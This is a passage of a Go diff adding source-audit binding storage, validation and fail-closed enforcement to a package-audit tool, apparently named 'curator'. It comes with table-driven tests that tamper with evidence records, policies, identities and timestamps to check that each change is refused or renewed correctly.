++	if len(stored) == 0 && len(live) == 0 {
++		return true
++	}
++	if len(stored) != len(live) {
++		return false
++	}
++	for i := range stored {
++		if stored[i] != live[i] {
++			return false
++		}
++	}
++	return true
++}
++
++// labelsEqual compares effective policy labels. Nil and empty both mean "no
++// labels" and compare equal so minimal test bindings without labels still
++// validate against empty stored label sets.
++func labelsEqual(stored, live []string) bool {
++	if len(stored) == 0 && len(live) == 0 {
++		return true
++	}
++	if len(stored) != len(live) {
++		return false
++	}
++	for i := range stored {
++		if stored[i] != live[i] {
++			return false
++		}
++	}
++	return true
++}
++
++// isRenewableAuditError reports whether a validation failure is an
++// authorized renewal the mutating path may re-issue after a fresh live run:
++// a trusted policy change or an aged timestamp. Classification reads only
++// the typed sourceAuditError outcome via errors.As — never message text —
++// so renewal markers interpolated into untrusted report fields cannot
++// promote a refusal. Every other failure is a broken existing record and
++// refuses on both paths, never overwriting.
++func isRenewableAuditError(err error) bool {
++	if err == nil {
++		return false
++	}
++	var typed *sourceAuditError
++	if errors.As(err, &typed) {
++		return typed.Renewable
++	}
++	return false
++}
++
++// auditRenewalCause returns the validator-assigned renewal cause ("policy"
++// or "stale") for a renewable error, or "" otherwise. Test-only helper for
++// asserting the typed outcome without parsing diagnostic text.
++func auditRenewalCause(err error) string {
++	var typed *sourceAuditError
++	if errors.As(err, &typed) && typed.Renewable {
++		return typed.Cause
++	}
++	return ""
++}
++
++// sourceAuditObjectExists reports whether a binding object is present for
++// the package identity, regardless of whether it or its report is readable.
++// It distinguishes first-time issuance (no object at all) from a broken
++// existing record (object present but report missing, unreadable, or
++// mismatching), which must refuse rather than re-establish.
++func sourceAuditObjectExists(home string, pkg SourcePackage) bool {
++	objectPath, err := SourceAuditPath(home, pkg)
++	if err != nil {
++		return false
++	}
++	_, statErr := os.Stat(objectPath)
++	return statErr == nil
++}
++
++// sourceAuditStoreKey derives the machine-private store key of one package
++// identity. The key carries no trust: it only locates the record the live
++// gates revalidate.
++func sourceAuditStoreKey(pkg SourcePackage) (string, error) {
++	canonical, err := protocoljson.MarshalCanonical(pkg.object())
++	if err != nil {
++		return "", err
++	}
++	sum := sha256.Sum256(canonical)
++	return hex.EncodeToString(sum[:]), nil
++}
++
++// SourceAuditPath is the deterministic machine-private object path for one
++// package identity. Bindings never enter the project tree.
++func SourceAuditPath(home string, pkg SourcePackage) (string, error) {
++	key, err := sourceAuditStoreKey(pkg)
++	if err != nil {
++		return "", err
++	}
++	return filepath.Join(home, "source-audit", key+".json"), nil
++}
++
++// SourceEvidencePath is the deterministic machine-private report path next
++// to the object.
++func SourceEvidencePath(home string, pkg SourcePackage) (string, error) {
++	key, err := sourceAuditStoreKey(pkg)
++	if err != nil {
++		return "", err
++	}
++	return filepath.Join(home, "source-audit", key+".report.json"), nil
++}
++
++// StoreSourceAudit persists one issued binding and its evidence report. The
++// report lands first so a crash can only leave an object without evidence —
++// which fails closed as unavailable — never evidence without an object. The
++// report bytes land verbatim: the evidence digest covers the exact stored
++// bytes, so no framing may be added here.
++func StoreSourceAudit(home string, object SourceAudit, evidence []byte) error {
++	evidencePath, err := SourceEvidencePath(home, object.Package)
++	if err != nil {
++		return err
++	}
++	if err := os.MkdirAll(filepath.Dir(evidencePath), 0o755); err != nil {
++		return err
++	}
++	payload, err := protocoljson.MarshalCanonical(map[string]any{
++		"content_sha256":  object.ContentSHA256,
++		"created_at":      object.CreatedAt,
++		"decision":        object.Decision,
++		"evidence_sha256": object.EvidenceSHA256,
++		"package":         object.Package.object(),
++		"policy_sha256":   object.PolicySHA256,
++		"schema_version":  object.SchemaVersion,
++	})
++	if err != nil {
++		return err
++	}
++	objectPath, err := SourceAuditPath(home, object.Package)
++	if err != nil {
++		return err
++	}
++	if err := os.WriteFile(evidencePath, append([]byte(nil), evidence...), 0o644); err != nil {
++		return err
++	}
++	return os.WriteFile(objectPath, append(payload, '\n'), 0o644)
++}
++
++// LoadSourceAudit reads one stored binding and its report. An absent pair
++// fails as unavailable; a present but malformed object fails as rejected.
++// Absence and corruption are different facts and stay distinguishable.
++func LoadSourceAudit(home string, pkg SourcePackage) (SourceAudit, []byte, error) {
++	objectPath, err := SourceAuditPath(home, pkg)
++	if err != nil {
++		return SourceAudit{}, nil, err
++	}
++	raw, err := os.ReadFile(objectPath) // #nosec G304 -- machine-private store path
++	if err != nil {
++		if os.IsNotExist(err) {
++			return SourceAudit{}, nil, fmt.Errorf("source_audit_unavailable: no machine binding for this package; run an install first")
++		}
++		return SourceAudit{}, nil, fmt.Errorf("source_audit_unavailable: binding is unreadable: %v", err)
++	}
++	object, err := ParseSourceAudit(raw)
++	if err != nil {
++		return SourceAudit{}, nil, err
++	}
++	evidencePath, err := SourceEvidencePath(home, pkg)
++	if err != nil {
++		return SourceAudit{}, nil, err
++	}
++	evidence, err := os.ReadFile(evidencePath) // #nosec G304 -- machine-private store path
++	if err != nil {
++		if os.IsNotExist(err) {
++			return SourceAudit{}, nil, fmt.Errorf("source_audit_unavailable: audit report is absent; re-run the gates")
++		}
++		return SourceAudit{}, nil, fmt.Errorf("source_audit_unavailable: audit report is unreadable: %v", err)
++	}
++	return object, evidence, nil
++}
++
++// SourceSubject is one draft member under source-audit validation.
++type SourceSubject struct {
++	Name            string
++	Source          string // revocation identity: declared source
++	Git             string // revocation identity: declared git URL
++	Commit          string
++	Snapshot        string // frozen tree for live detection
++	SchemaVersion   int
++	Capabilities    capabilities.Manifest
++	Package         SourcePackage // locked identity
++	ContentSHA256   string        // locked context hash
++	ScriptLabels    []string
++	AssuranceLabels []string
++}
++
++// CheckSourceAudit validates — or, on the mutating path, establishes — the
++// source-audit binding of one draft member. It is a no-op when audit is
++// disabled, mirroring Gate. The stored object is never authority: every
++// binding is recomputed under the current trusted policy and the live
++// decision is enforced. Returns gate warnings (warn verdicts) or a failure.
++//
++//   - first issuance (no binding at all) + mutating path: run the full live
++//     pipeline, enforce the verdict, then issue and store the binding;
++//   - first issuance + read-only path: fail unavailable — planning must not
++//     invent trust, and missing evidence is unknown, never current;
++//   - broken existing record (binding present but report missing,
++//     unreadable, malformed, or mismatching): refuse with a source_audit_*
++//     diagnostic on both paths, never overwriting;
++//   - present binding: revalidate all six bindings; only an aged timestamp
++//     or a trusted policy change renews through a fresh live run on the
++//     mutating path, the read-only path refuses stale bindings.
++//
++// The live verdict is enforced before any stored state is consulted, so
++// hostile content reports audit blocked even when a prior allow binding
++// exists; a stored allow never authorizes new blocking content.
++func CheckSourceAudit(cfg *config.Config, subject SourceSubject, persist bool, now time.Time) ([]string, error) {
++	if !cfg.Audit.Enabled {
++		return nil, nil
++	}
++	if !runStaticCanary() {
++		return nil, fmt.Errorf("audit blocked: %s: audit canary failed: detectors are not producing expected findings", subject.Name)
++	}
++	policy, err := PolicyDigest(PolicyInputs{
++		AuditMode:       cfg.Audit.Mode,
++		AuditFailOn:     cfg.Audit.FailOn,
++		Revocations:     cfg.Audit.Revocations,
++		ScriptLabels:    subject.ScriptLabels,
++		AssuranceLabels: subject.AssuranceLabels,
++	})
++	if err != nil {
++		return nil, fmt.Errorf("audit blocked: %s: %v", subject.Name, err)
++	}
++	report, err := auditSubject(cfg, Subject{
++		Name: subject.Name, Source: subject.Source, Git: subject.Git,
++		Commit: subject.Commit, Snapshot: subject.Snapshot,
++		SchemaVersion: subject.SchemaVersion, Capabilities: subject.Capabilities,
++	}, persist)
++	if err != nil {
++		return nil, fmt.Errorf("audit blocked: %s: %v", subject.Name, err)
++	}
++	if err := enforceSourceDecision(subject.Name, report); err != nil {
++		return nil, err
++	}
++	object, storedEvidence, loadErr := LoadSourceAudit(cfg.Home(), subject.Package)
++	if loadErr != nil {
++		if !isUnavailable(loadErr) {
++			return nil, fmt.Errorf("%s: %v", subject.Name, loadErr)
++		}
++		if !persist {
++			return nil, fmt.Errorf("%s: %v", subject.Name, loadErr)
++		}
++		if sourceAuditObjectExists(cfg.Home(), subject.Package) {
++			return nil, fmt.Errorf("%s: source_audit_rejected: evidence: existing binding has a missing or unreadable report; re-run with fresh state: %v", subject.Name, loadErr)
++		}
++		return establishSourceAudit(cfg, subject, policy, report, now)
++	}
++	expected := SourceExpectation{
++		Package: subject.Package, Content: subject.ContentSHA256,
++		Policy: policy, Evidence: storedEvidence, Decision: report.Decision,
++		Now: now, MaxAge: DefaultSourceAuditMaxAge,
++		Skill: subject.Name, Findings: report.Findings,
++		Pinned:  isPinned(cfg, report.ContentSHA256),
++		Revoked: report.Revoked, Revocation: report.Revocation,
++		ScriptLabels: subject.ScriptLabels, AssuranceLabels: subject.AssuranceLabels,
++	}
++	if err := ValidateSourceAudit(object, expected); err != nil {
++		if !persist {
++			return nil, fmt.Errorf("%s: %w", subject.Name, err)
++		}
++		if !isRenewableAuditError(err) {
++			return nil, fmt.Errorf("%s: %w", subject.Name, err)
++		}
++		return establishSourceAudit(cfg, subject, policy, report, now)
++	}
++	return enforceSourceWarnings(report), nil
++}
++
++// establishSourceAudit enforces one fresh live verdict and stores its
++// binding. It runs only on the mutating path, after the live pipeline.
++func establishSourceAudit(cfg *config.Config, subject SourceSubject, policy string, report Report, now time.Time) ([]string, error) {
++	if fail := enforceSourceDecision(subject.Name, report); fail != nil {
++		return nil, fail
++	}
++	pinned := isPinned(cfg, report.ContentSHA256)
++	evidence, err := MarshalEvidenceReport(EvidenceReport{
++		SchemaVersion: 1, Skill: subject.Name, Package: subject.Package,
++		ContentSHA256: subject.ContentSHA256, Findings: report.Findings,
++		Pinned: pinned, Revoked: report.Revoked, Revocation: report.Revocation,
++		ScriptPolicy: subject.ScriptLabels, AssurancePolicy: subject.AssuranceLabels,
++		Decision: report.Decision,
++	})
++	if err != nil {
++		return nil, fmt.Errorf("audit blocked: %s: %v", subject.Name, err)
++	}
++	object := SourceAudit{
++		SchemaVersion: SourceAuditSchemaVersion, Package: subject.Package,
++		ContentSHA256: subject.ContentSHA256, PolicySHA256: policy,
++		EvidenceSHA256: EvidenceDigest(evidence), Decision: report.Decision,
++		CreatedAt: now.UTC().Format(time.RFC3339),
++	}
++	if err := StoreSourceAudit(cfg.Home(), object, evidence); err != nil {
++		return nil, fmt.Errorf("audit blocked: %s: %v", subject.Name, err)
++	}
++	return enforceSourceWarnings(report), nil
++}
++
++// enforceSourceDecision fails closed on block and require_pin verdicts,
++// mirroring the gate refusal wording for the same outcome.
++func enforceSourceDecision(skill string, report Report) error {
++	switch report.Decision {
++	case DecisionAllow, DecisionWarn:
++		return nil
++	case DecisionRequirePin:
++		return fmt.Errorf(
++			"audit requires pin: %s: content hash %s is not pinned with a reason",
++			skill, report.ContentSHA256)
++	default: // block, including revocations
++		if report.Revoked {
++			return fmt.Errorf("audit blocked: %s: %s is revoked", skill, report.Revocation)
++		}
++		if len(report.Findings) == 0 {
++			return fmt.Errorf("audit blocked: %s", skill)
++		}
++		var errs []string
++		for _, finding := range report.Findings {
++			errs = append(errs, fmt.Sprintf("audit blocked: %s: %s %s - %s", skill, finding.Severity, finding.ID, finding.Evidence))
++		}
++		return fmt.Errorf("%s", strings.Join(errs, "; "))
++	}
++}
++
++// enforceSourceWarnings renders warn-verdict findings as gate warnings.
++func enforceSourceWarnings(report Report) []string {
++	if report.Decision != DecisionWarn {
++		return nil
++	}
++	var warnings []string
++	for _, finding := range report.Findings {
++		warnings = append(warnings, fmt.Sprintf("audit warning: %s: %s %s - %s", report.Skill, finding.Severity, finding.ID, finding.Evidence))
++	}
++	return warnings
++}
++
++func isUnavailable(err error) bool {
++	return err != nil && strings.Contains(err.Error(), "source_audit_unavailable")
++}
+diff --git a/internal/audit/sourceaudit_test.go b/internal/audit/sourceaudit_test.go
+new file mode 100644
+index 0000000..8f6191c
+--- /dev/null
++++ b/internal/audit/sourceaudit_test.go
+@@ -0,0 +1,1501 @@
++package audit
++
++import (
++	"bytes"
++	"encoding/json"
++	"os"
++	"path/filepath"
++	"strings"
++	"testing"
++	"time"
++
++	"github.com/relux-works/curator/internal/capabilities"
++	"github.com/relux-works/curator/internal/hashing"
++)
++
++func jsonUnmarshal(payload []byte, destination any) error {
++	decoder := json.NewDecoder(bytes.NewReader(payload))
++	decoder.DisallowUnknownFields()
++	return decoder.Decode(destination)
++}
++
++func jsonMarshal(value any) ([]byte, error) {
++	return json.Marshal(value)
++}
++
++var sourceAuditTestNow = time.Date(2026, 9, 17, 12, 0, 0, 0, time.UTC)
++
++func testLocalPackage() SourcePackage {
++	return SourcePackage{
++		Kind:     SourcePackageLocalSnapshot,
++		Snapshot: "sha256:" + strings.Repeat("1", 64),
++	}
++}
++
++func testGitPackage() SourcePackage {
++	return SourcePackage{
++		Kind:       SourcePackageNetworkGit,
++		Repository: "example.org/kit",
++		Commit:     &SourceCommit{ObjectFormat: "sha1", Hex: strings.Repeat("a", 40)},
++		Directory:  "skills/review",
++	}
++}
++
++func testPolicy(t *testing.T) string {
++	t.Helper()
++	policy, err := PolicyDigest(PolicyInputs{AuditMode: "advisory", AuditFailOn: "high"})
++	if err != nil {
++		t.Fatal(err)
++	}
++	return policy
++}
++
++// validBinding builds one fully consistent object/expectation pair. Every
++// negative row mutates exactly one binding of the copy it receives. The
++// report is complete per skillfile-sources §4: findings, pins, revocations,
++// and effective script/assurance labels are all present and bound to the
++// live trusted state.
++func validBinding(t *testing.T) (SourceAudit, SourceExpectation) {
++	t.Helper()
++	pkg := testLocalPackage()
++	content := "sha256:" + strings.Repeat("2", 64)
++	policy := testPolicy(t)
++	scriptLabels := []string{"script-worker-v1:unsupported"}
++	assuranceLabels := []string{"policy:curator-artifact-policy-v1"}
++	report := EvidenceReport{
++		SchemaVersion: 1, Skill: "review", Package: pkg, ContentSHA256: content,
++		Findings: []Finding{}, Pinned: false, Revoked: false, Revocation: "",
++		ScriptPolicy: scriptLabels, AssurancePolicy: assuranceLabels,
++		Decision: DecisionAllow,
++	}
++	evidence, err := MarshalEvidenceReport(report)
++	if err != nil {
++		t.Fatal(err)
++	}
++	object := SourceAudit{
++		SchemaVersion: SourceAuditSchemaVersion, Package: pkg,
++		ContentSHA256: content, PolicySHA256: policy,
++		EvidenceSHA256: EvidenceDigest(evidence), Decision: DecisionAllow,
++		CreatedAt: "2026-09-17T11:59:00Z",
++	}
++	expected := SourceExpectation{
++		Package: pkg, Content: content, Policy: policy,
++		Evidence: evidence, Decision: DecisionAllow,
++		Now: sourceAuditTestNow, MaxAge: DefaultSourceAuditMaxAge,
++		Skill: "review", Findings: []Finding{},
++		Pinned: false, Revoked: false, Revocation: "",
++		ScriptLabels: scriptLabels, AssuranceLabels: assuranceLabels,
++	}
++	return object, expected
++}
++
++func TestParseSourceAuditValid(t *testing.T) {
++	// Mirrors the draft conformance valid.json shape.
++	payload := `{"schema_version":1,` +
++		`"package":{"kind":"local-snapshot","snapshot":"sha256:` + strings.Repeat("1", 64) + `"},` +
++		`"content_sha256":"sha256:` + strings.Repeat("1", 64) + `",` +
++		`"policy_sha256":"sha256:` + strings.Repeat("1", 64) + `",` +
++		`"evidence_sha256":"sha256:` + strings.Repeat("1", 64) + `",` +
++		`"decision":"allow","created_at":"2026-09-10T00:00:00Z"}`
++	object, err := ParseSourceAudit([]byte(payload))
++	if err != nil {
++		t.Fatalf("valid object rejected: %v", err)
++	}
++	if object.Package.Kind != SourcePackageLocalSnapshot || object.Decision != DecisionAllow {
++		t.Fatalf("parsed: %+v", object)
++	}
++}
++
++func TestParseSourceAuditMalformed(t *testing.T) {
++	sha := "sha256:" + strings.Repeat("1", 64)
++	base := `{"schema_version":1,` +
++		`"package":{"kind":"local-snapshot","snapshot":"` + sha + `"},` +
++		`"content_sha256":"` + sha + `","policy_sha256":"` + sha + `",` +
++		`"evidence_sha256":"` + sha + `",` +
++		`"decision":"allow","created_at":"2026-09-10T00:00:00Z"}`
++	cases := []struct {
++		name    string
++		mutate  func(string) string
++		wantSub string
++	}{
++		// The draft conformance invalid-decision.json shape.
++		{"unknown decision", func(s string) string {
++			return strings.Replace(s, `"decision":"allow"`, `"decision":"trusted"`, 1)
++		}, "source_audit_rejected"},
++		// The draft conformance invalid-no-evidence.json shape.
++		{"missing evidence", func(s string) string {
++			return strings.Replace(s, `"evidence_sha256":"`+sha+`",`, ``, 1)
++		}, "source_audit_rejected"},
++		{"unknown top-level field", func(s string) string {
++			return strings.Replace(s, `"decision":"allow"`, `"decision":"allow","registry":"x"`, 1)
++		}, "source_audit_rejected"},
++		{"wrong schema version", func(s string) string {
++			return strings.Replace(s, `"schema_version":1`, `"schema_version":2`, 1)
++		}, "source_audit_rejected"},
++		{"malformed digest", func(s string) string {
++			return strings.Replace(s, `"content_sha256":"`+sha+`"`, `"content_sha256":"nope"`, 1)
++		}, "source_audit_rejected"},
++		{"non-UTC timestamp", func(s string) string {
++			return strings.Replace(s, `2026-09-10T00:00:00Z`, `2026-09-10T00:00:00+02:00`, 1)
++		}, "source_audit_rejected"},
++		{"malformed timestamp", func(s string) string {
++			return strings.Replace(s, `2026-09-10T00:00:00Z`, `yesterday`, 1)
++		}, "source_audit_rejected"},
++		{"cross-arm package", func(s string) string {
++			return strings.Replace(s, `"snapshot":"`+sha+`"`, `"snapshot":"`+sha+`","repository":"example.org/x"`, 1)
++		}, "source_audit_rejected"},
++		{"trailing object", func(s string) string { return s + "{}" }, "source_audit_rejected"},
++		{"trailing newline plus object", func(s string) string { return s + "\n{}" }, "source_audit_rejected"},
++		{"trailing garbage", func(s string) string { return s + " trailing" }, "source_audit_rejected"},
++		{"not JSON", func(string) string { return `{{{` }, "source_audit_rejected"},
++	}
++	for _, tc := range cases {
++		t.Run(tc.name, func(t *testing.T) {
++			if _, err := ParseSourceAudit([]byte(tc.mutate(base))); err == nil ||
++				!strings.Contains(err.Error(), tc.wantSub) {
++				t.Fatalf("err = %v, want %q", err, tc.wantSub)
++			}
++		})
++	}
++}
++
++func TestSourceAuditLocalPackageShape(t *testing.T) {
++	// The marshalled local arm must match the source-types-v1 arm exactly:
++	// no commit, repository, source, or directory members.
++	canonical, err := MarshalEvidenceReport(EvidenceReport{Package: testLocalPackage()})
++	if err != nil {
++		t.Fatal(err)
++	}
++	if strings.Contains(string(canonical), `"commit"`) ||
++		strings.Contains(string(canonical), `"repository"`) {
++		t.Fatalf("local package carries Git members: %s", canonical)
++	}
++	// The Git arm keeps its commit object.
++	git, err := MarshalEvidenceReport(EvidenceReport{Package: testGitPackage()})
++	if err != nil {
++		t.Fatal(err)
++	}
++	for _, want := range []string{`"commit"`, `"object_format":"sha1"`, `"repository":"example.org/kit"`} {
++		if !strings.Contains(string(git), want) {
++			t.Fatalf("git package missing %s: %s", want, git)
++		}
++	}
++	// Both arms validate; a Git-shaped commit on a local arm does not.
++	if err := testLocalPackage().validate(); err != nil {
++		t.Fatalf("local arm: %v", err)
++	}
++	if err := testGitPackage().validate(); err != nil {
++		t.Fatalf("git arm: %v", err)
++	}
++	bad := testLocalPackage()
++	bad.Commit = &SourceCommit{ObjectFormat: "sha1", Hex: strings.Repeat("a", 40)}
++	if err := bad.validate(); err == nil {
++		t.Fatalf("local arm with commit must fail")
++	}
++}
++
++func TestValidateSourceAuditBindings(t *testing.T) {
++	t.Run("valid", func(t *testing.T) {
++		object, expected := validBinding(t)
++		if err := ValidateSourceAudit(object, expected); err != nil {
++			t.Fatalf("valid binding rejected: %v", err)
++		}
++	})
++	t.Run("git arm valid", func(t *testing.T) {
++		object, expected := validBinding(t)
++		pkg := testGitPackage()
++		report := EvidenceReport{
++			SchemaVersion: 1, Skill: expected.Skill, Package: pkg,
++			ContentSHA256: expected.Content, Findings: expected.Findings,
++			Pinned: expected.Pinned, Revoked: expected.Revoked, Revocation: expected.Revocation,
++			ScriptPolicy: expected.ScriptLabels, AssurancePolicy: expected.AssuranceLabels,
++			Decision: DecisionAllow,
++		}
++		evidence, err := MarshalEvidenceReport(report)
++		if err != nil {
++			t.Fatal(err)
++		}
++		object.Package = pkg
++		object.EvidenceSHA256 = EvidenceDigest(evidence)
++		expected.Package = pkg
++		expected.Evidence = evidence
++		if err := ValidateSourceAudit(object, expected); err != nil {
++			t.Fatalf("git binding rejected: %v", err)
++		}
++		// A value-equal package reached through a different pointer still
++		// binds: pointer identity must not leak into equality.
++		clone := testGitPackage()
++		expected.Package = clone
++		if err := ValidateSourceAudit(object, expected); err != nil {
++			t.Fatalf("equal git package rejected: %v", err)
++		}
++	})
++	cases := []struct {
++		name    string
++		mutate  func(*SourceAudit, *SourceExpectation, *testing.T)
++		wantSub string
++	}{
++		{"identity", func(object *SourceAudit, _ *SourceExpectation, _ *testing.T) {
++			object.Package.Snapshot = "sha256:" + strings.Repeat("9", 64)
++		}, "source_audit_rejected: identity"},
++		{"identity kind", func(object *SourceAudit, expected *SourceExpectation, _ *testing.T) {
++			object.Package = testGitPackage()
++			expected.Package = testGitPackage()
++			expected.Package.Repository = "example.org/other"
++		}, "source_audit_rejected: identity"},
++		{"context", func(object *SourceAudit, _ *SourceExpectation, _ *testing.T) {
++			object.ContentSHA256 = "sha256:" + strings.Repeat("9", 64)
++		}, "source_audit_rejected: context"},
++		{"policy", func(object *SourceAudit, _ *SourceExpectation, _ *testing.T) {
++			object.PolicySHA256 = "sha256:" + strings.Repeat("9", 64)
++		}, "source_audit_rejected: policy"},
++		{"evidence digest", func(_ *SourceAudit, expected *SourceExpectation, _ *testing.T) {
++			expected.Evidence = append(append([]byte(nil), expected.Evidence...), ' ')
++		}, "source_audit_rejected: evidence"},
++		{"evidence spliced report", func(object *SourceAudit, expected *SourceExpectation, t *testing.T) {
++			foreign := EvidenceReport{
++				SchemaVersion: 1, Skill: "other", Package: object.Package,
++				ContentSHA256: "sha256:" + strings.Repeat("8", 64),
++				Findings:      expected.Findings, Pinned: expected.Pinned,
++				Revoked: expected.Revoked, Revocation: expected.Revocation,
++				ScriptPolicy: expected.ScriptLabels, AssurancePolicy: expected.AssuranceLabels,
++				Decision: DecisionAllow,
++			}
++			evidence, err := MarshalEvidenceReport(foreign)
++			if err != nil {
++				t.Fatal(err)
++			}
++			object.EvidenceSHA256 = EvidenceDigest(evidence)
++			expected.Evidence = evidence
++		}, "source_audit_rejected: evidence"},
++		{"evidence decision split", func(object *SourceAudit, expected *SourceExpectation, t *testing.T) {
++			split := EvidenceReport{
++				SchemaVersion: 1, Skill: expected.Skill, Package: object.Package,
++				ContentSHA256: object.ContentSHA256, Findings: expected.Findings,
++				Pinned: expected.Pinned, Revoked: expected.Revoked, Revocation: expected.Revocation,
++				ScriptPolicy: expected.ScriptLabels, AssurancePolicy: expected.AssuranceLabels,
++				Decision: DecisionWarn,
++			}
++			evidence, err := MarshalEvidenceReport(split)
++			if err != nil {
++				t.Fatal(err)
++			}
++			object.EvidenceSHA256 = EvidenceDigest(evidence)
++			expected.Evidence = evidence
++		}, "source_audit_rejected: evidence"},
++		{"time future", func(object *SourceAudit, _ *SourceExpectation, _ *testing.T) {
++			object.CreatedAt = "2026-09-18T12:00:00Z"
++		}, "source_audit_rejected: time"},
++		{"time stale", func(object *SourceAudit, expected *SourceExpectation, _ *testing.T) {
++			object.CreatedAt = "2026-09-01T12:00:00Z"
++			expected.Now = sourceAuditTestNow
++		}, "source_audit_rejected: time"},
++		{"decision", func(_ *SourceAudit, expected *SourceExpectation, _ *testing.T) {
++			expected.Decision = DecisionBlock
++		}, "source_audit_rejected: decision"},
++		{"evidence incomplete stripped", func(object *SourceAudit, expected *SourceExpectation, t *testing.T) {
++			var raw map[string]any
++			if err := jsonUnmarshal(expected.Evidence, &raw); err != nil {
++				t.Fatal(err)
++			}
++			delete(raw, "findings")
++			delete(raw, "pinned")
++			delete(raw, "revoked")
++			delete(raw, "script_policy")
++			delete(raw, "assurance_policy")
++			delete(raw, "schema_version")
++			raw["skill"] = "different-skill"
++			forged, err := jsonMarshal(raw)
++			if err != nil {
++				t.Fatal(err)
++			}
++			object.EvidenceSHA256 = EvidenceDigest(forged)
++			expected.Evidence = forged
++		}, "source_audit_rejected: evidence"},
++		{"evidence wrong skill recomputed", func(object *SourceAudit, expected *SourceExpectation, t *testing.T) {
++			var report EvidenceReport
++			if err := jsonUnmarshal(expected.Evidence, &report); err != nil {
++				t.Fatal(err)
++			}
++			report.Skill = "different-skill"
++			forged, err := MarshalEvidenceReport(report)
++			if err != nil {
++				t.Fatal(err)
++			}
++			object.EvidenceSHA256 = EvidenceDigest(forged)
++			expected.Evidence = forged
++		}, "source_audit_rejected: evidence"},
++		{"evidence findings mismatch", func(object *SourceAudit, expected *SourceExpectation, t *testing.T) {
++			var report EvidenceReport
++			if err := jsonUnmarshal(expected.Evidence, &report); err != nil {
++				t.Fatal(err)
++			}
++			report.Findings = []Finding{{ID: "injected", Severity: SeverityHigh, Evidence: "x", Verifiable: true}}
++			forged, err := MarshalEvidenceReport(report)
++			if err != nil {
++				t.Fatal(err)
++			}
++			object.EvidenceSHA256 = EvidenceDigest(forged)
++			expected.Evidence = forged
++		}, "source_audit_rejected: evidence"},
++		{"evidence pin mismatch", func(object *SourceAudit, expected *SourceExpectation, t *testing.T) {
++			var report EvidenceReport
++			if err := jsonUnmarshal(expected.Evidence, &report); err != nil {
++				t.Fatal(err)
++			}
++			report.Pinned = !expected.Pinned
++			forged, err := MarshalEvidenceReport(report)
++			if err != nil {
++				t.Fatal(err)
++			}
++			object.EvidenceSHA256 = EvidenceDigest(forged)
++			expected.Evidence = forged
++		}, "source_audit_rejected: evidence"},
++		{"evidence script labels mismatch", func(object *SourceAudit, expected *SourceExpectation, t *testing.T) {
++			var report EvidenceReport
++			if err := jsonUnmarshal(expected.Evidence, &report); err != nil {
++				t.Fatal(err)
++			}
++			report.ScriptPolicy = []string{"script-worker-v1:supported"}
++			forged, err := MarshalEvidenceReport(report)
++			if err != nil {
++				t.Fatal(err)
++			}
++			object.EvidenceSHA256 = EvidenceDigest(forged)
++			expected.Evidence = forged
++		}, "source_audit_rejected: evidence"},
++		{"evidence assurance labels mismatch", func(object *SourceAudit, expected *SourceExpectation, t *testing.T) {
++			var report EvidenceReport
++			if err := jsonUnmarshal(expected.Evidence, &report); err != nil {
++				t.Fatal(err)
++			}
++			report.AssurancePolicy = []string{"policy:other"}
++			forged, err := MarshalEvidenceReport(report)
++			if err != nil {
++				t.Fatal(err)
++			}
++			object.EvidenceSHA256 = EvidenceDigest(forged)
++			expected.Evidence = forged
++		}, "source_audit_rejected: evidence"},
++	}
++	for _, tc := range cases {
++		t.Run(tc.name, func(t *testing.T) {
++			object, expected := validBinding(t)
++			tc.mutate(&object, &expected, t)
++			err := ValidateSourceAudit(object, expected)
++			if err == nil || !strings.Contains(err.Error(), tc.wantSub) {
++				t.Fatalf("err = %v, want %q", err, tc.wantSub)
++			}
++			// Narrowing: the same mutation with the digest left stale is
++			// still an evidence refusal, not a different class.
++			if strings.HasPrefix(tc.name, "evidence") && tc.name != "evidence digest" {
++				object2, expected2 := validBinding(t)
++				tc.mutate(&object2, &expected2, t)
++				object2.EvidenceSHA256 = "sha256:" + strings.Repeat("0", 64)
++				if err := ValidateSourceAudit(object2, expected2); err == nil ||
++					!strings.Contains(err.Error(), "source_audit_rejected: evidence") {
++					t.Fatalf("narrowed digest err = %v, want evidence", err)
++				}
++			}
++		})
++	}
++}
++
++// TestValidateSourceAuditRenewableClassification pins the renewal boundary:
++// only a trusted policy change or a stale timestamp renews on the mutating
++// path; evidence integrity, identity, context, forged time, and decision
++// drift never overwrite.
++func TestValidateSourceAuditRenewableClassification(t *testing.T) {
++	object, expected := validBinding(t)
++	if !isRenewableAuditError(mutatePolicy(object, expected)) {
++		t.Fatalf("policy change must be renewable")
++	}
++	if !isRenewableAuditError(mutateStale(object, expected)) {
++		t.Fatalf("stale timestamp must be renewable")
++	}
++	for name, mutate := range map[string]func(SourceAudit, SourceExpectation) error{
++		"identity": func(object SourceAudit, expected SourceExpectation) error {
++			object.Package.Snapshot = "sha256:" + strings.Repeat("9", 64)
++			return ValidateSourceAudit(object, expected)
++		},
++		"evidence digest": func(object SourceAudit, expected SourceExpectation) error {
++			expected.Evidence = append(append([]byte(nil), expected.Evidence...), ' ')
++			return ValidateSourceAudit(object, expected)
++		},
++		"future": func(object SourceAudit, expected SourceExpectation) error {
++			object.CreatedAt = "2026-09-18T12:00:00Z"
++			return ValidateSourceAudit(object, expected)
++		},
++		"decision": func(object SourceAudit, expected SourceExpectation) error {
++			expected.Decision = DecisionBlock
++			return ValidateSourceAudit(object, expected)
++		},
++	} {
++		if err := mutate(object, expected); err == nil {
++			t.Fatalf("%s must fail", name)
++		} else if isRenewableAuditError(err) {
++			t.Fatalf("%s must not be renewable: %v", name, err)
++		}
++	}
++}
++
++func mutatePolicy(object SourceAudit, expected SourceExpectation) error {
++	object.PolicySHA256 = "sha256:" + strings.Repeat("9", 64)
++	return ValidateSourceAudit(object, expected)
++}
++
++func mutateStale(object SourceAudit, expected SourceExpectation) error {
++	object.CreatedAt = "2026-09-01T12:00:00Z"
++	return ValidateSourceAudit(object, expected)
++}
++
++func TestPolicyDigestSensitive(t *testing.T) {
++	base, err := PolicyDigest(PolicyInputs{AuditMode: "advisory", AuditFailOn: "high"})
++	if err != nil {
++		t.Fatal(err)
++	}
++	again, err := PolicyDigest(PolicyInputs{AuditMode: "advisory", AuditFailOn: "high"})
++	if err != nil {
++		t.Fatal(err)
++	}
++	if base != again {
++		t.Fatalf("policy digest unstable: %s vs %s", base, again)
++	}
++	if !strings.HasPrefix(base, "sha256:") {
++		t.Fatalf("policy digest shape: %s", base)
++	}
++	changed := []PolicyInputs{
++		{AuditMode: "strict", AuditFailOn: "high"},
++		{AuditMode: "advisory", AuditFailOn: "critical"},
++		{AuditMode: "advisory", AuditFailOn: "high", Revocations: []string{"sha256:" + strings.Repeat("f", 64)}},
